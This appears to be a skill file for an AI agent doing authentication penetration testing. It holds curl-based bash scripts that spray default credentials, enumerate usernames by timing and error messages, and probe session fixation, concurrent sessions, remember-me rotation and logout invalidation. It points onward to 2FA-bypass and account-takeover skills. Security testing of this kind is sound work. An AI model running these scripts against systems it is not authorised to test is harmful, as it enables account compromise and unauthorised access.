---
name: vuln-auth-workflow
description: "Authentication workflow testing — login bypass, session management flaws, insecure remember-me, concurrent session handling, account lockout bypass, credential stuffing. Triggers: 'authentication testing', 'auth bypass', 'login bypass', 'session management', 'remember me', 'concurrent sessions', 'account lockout', 'auth workflow', 'login security'."
---

# Authentication Workflow Testing

Test authentication mechanisms for bypass, session flaws, and credential exposure.

---

## Phase 1: Login Testing

```bash
TARGET="https://TARGET"

# Default credentials:
DEFAULT_CREDS=("admin:admin" "admin:password" "admin:123456" "root:root" "test:test" "admin:admin123")
for CRED in "${DEFAULT_CREDS[@]}"; do
  USER=$(echo $CRED | cut -d: -f1)
  PASS=$(echo $CRED | cut -d: -f2)
  RESP=$(curl -s -X POST "$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}")
  echo "$CRED → $(echo $RESP | grep -oE '"token"|"error"|"success"' | head -1)"
done | tee output/default_creds.txt

# Username enumeration via timing/response difference:
VALID_USER="admin"
INVALID_USER="nonexistent_user_xyz"
TIME_VALID=$(curl -s -o /dev/null -w "%{time_total}" -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$VALID_USER\",\"password\":\"wrong\"}")
TIME_INVALID=$(curl -s -o /dev/null -w "%{time_total}" -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$INVALID_USER\",\"password\":\"wrong\"}")
echo "Valid user: ${TIME_VALID}s | Invalid user: ${TIME_INVALID}s (timing difference = enumeration)"

# Username enumeration via response message:
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}' | jq .message
```

---

## Phase 2: Session Management

```bash
TARGET="https://TARGET"

# Check session cookie security attributes:
curl -s -c - "$TARGET/login" | grep -i "session\|auth\|token" | \
  awk '{for(i=1;i<=NF;i++) if($i ~ /Secure|HttpOnly|SameSite|Expires/) printf $i" "; print ""}'

# Session fixation — get pre-auth session, check if rotated after login:
PRE_SESSION=$(curl -s -c - "$TARGET/" | grep session | awk '{print $7}')
curl -s -X POST "$TARGET/api/login" \
  -H "Cookie: session=$PRE_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}' -c /tmp/post_login_cookies.txt
POST_SESSION=$(grep session /tmp/post_login_cookies.txt | awk '{print $7}')
[ "$PRE_SESSION" == "$POST_SESSION" ] && echo "SESSION FIXATION: session NOT rotated after login"

# Multiple concurrent sessions:
# Log in twice — are both tokens valid?
TOKEN_1=$(curl -s -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"pass"}' | jq -r '.token')
TOKEN_2=$(curl -s -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"pass"}' | jq -r '.token')
curl -s -H "Authorization: Bearer $TOKEN_1" "$TARGET/api/v1/profile" | jq .id
curl -s -H "Authorization: Bearer $TOKEN_2" "$TARGET/api/v1/profile" | jq .id
```

---

## Phase 3: Remember-Me & Long-lived Tokens

```bash
TARGET="https://TARGET"

# Check remember-me token entropy:
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"pass","remember":true}' | jq -r '.remember_token // .refresh_token'

# Check if remember-me token rotates on use:
REMEMBER_TOKEN="TOKEN"
curl -s "$TARGET/api/refresh" -H "Cookie: remember=$REMEMBER_TOKEN"
curl -s "$TARGET/api/refresh" -H "Cookie: remember=$REMEMBER_TOKEN"  # same token still works?

# Check logout invalidates all tokens:
TOKEN=$(curl -s -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"pass"}' | jq -r '.token')
curl -s -X POST "$TARGET/api/logout" -H "Authorization: Bearer $TOKEN"
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/profile"  # should be 401
```

---

## Output

Save to `output/`:
- `default_creds.txt` — default credential test results
- `auth_flaws.txt` — identified authentication weaknesses

## Next Phase

→ `vuln-2fa-bypass` for MFA testing
→ `vuln-account-takeover` to chain auth flaws to ATO
